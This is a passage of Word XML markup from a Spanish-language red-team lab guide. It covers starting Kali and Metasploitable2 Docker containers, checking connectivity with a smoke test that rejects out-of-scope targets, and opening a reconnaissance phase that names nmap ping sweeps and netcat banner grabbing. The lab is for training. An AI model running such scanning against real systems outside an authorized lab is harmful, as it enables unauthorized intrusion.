          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>2.2 Construir e iniciar los contenedores</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AEC812E" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>cd C:\Project-Red-Team\docker</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E246FB8" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>docker</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>compose</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> up -d --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>build</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="46DEAD8D" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="67B4CD8A" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>El primer arranque descarga imágenes (~2-3 GB). Las siguientes veces tarda ~30 segundos.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E3E26BD" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">Salida </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>esperada</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5160E0F3" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>[+] Building ...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CA29E47" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>[+] Running 3/3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="559EAEA8" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"> ✔ Network lab-net              Created</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="439F4AF5" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"> ✔ Container redteam-target     Started</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="510B705F" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"> ✔ Container redteam-kali       Started</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EE2BE69" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1BAF8A14" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>2.3 Verificar que ambos contenedores están corriendo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3850E321" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">docker </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>ps</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="122635DE" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5EED470F" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Salida esperada:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FCBFA3E" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>CONTAINER ID   IMAGE                      STATUS         NAMES</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F4BF6A9" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>xxxxxxxxxxxx   kalilinux/kali-rolling     Up X seconds   redteam-kali</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00429EF2" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>xxxxxxxxxxxx   tleemcjr/metasploitable2   Up X seconds   redteam-target</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16D84C75" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="02F9F43C" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">Si </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>redteam</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>-target</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> aparece en </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Restarting</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>, esperar 30 segundos y volver a verificar — Metasploitable2 tarda en iniciar todos sus servicios.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A1B4777" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>2.4 Verificar conectividad básica</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13918FEF" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>docker</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>exec</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>redteam-kali</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> ping -c 3 172.20.0.20</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="524B8F80" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="37CD0CE0" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Salida esperada:</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> 3 paquetes enviados, 0% </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>packet</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>loss</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5073AC04" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3564"/>
        </w:pBdr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="009AE99A" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
        <w:spacing w:before="280" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>3. Verificar conectividad</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52006BBF" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3564"/>
        </w:pBdr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="75325E12" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">El proyecto incluye un script de </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>smoke</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> tests que valida el entorno antes de empezar.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="284FBC1F" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">docker exec </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>redteam</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>-kali bash /root/scripts/lib/test-common.sh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15F0B42D" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4E3CDDB1" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Salida esperada (6 tests pasando):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1011A3C0" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>[PASS] Target 172.20.0.20 is reachable (ping)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FC3A511" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>[PASS] SSH port 22 is open on target</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FA02603" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>[PASS] HTTP port 80 is open on target</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DDF1AB5" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>[PASS] FTP port 21 is open on target</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13104E86" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>[PASS] validate_target rejects out-of-scope IP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73A12A11" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>[PASS] validate_target accepts 172.20.0.20</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08D7C1A5" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>--- 6/6 passed ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="582C86F8" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3F42C27E" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Si algún test falla, esperar 30 segundos y repetir — Metasploitable2 puede tardar hasta 2 minutos en tener todos los servicios activos.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F2C32E9" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3564"/>
        </w:pBdr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5DAA1E5C" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
        <w:spacing w:before="280" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>4. Fase 1 — Reconocimiento</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="625BAA3A" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3564"/>
        </w:pBdr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="719E681B" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Objetivo:</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Descubrir hosts activos en la red, obtener banners de servicios y resolver DNS inverso.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="650CC95F" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Técnicas</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> Ping sweep (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> -sn), banner grabbing (netcat), DNS reverso (dig).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36961B34" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
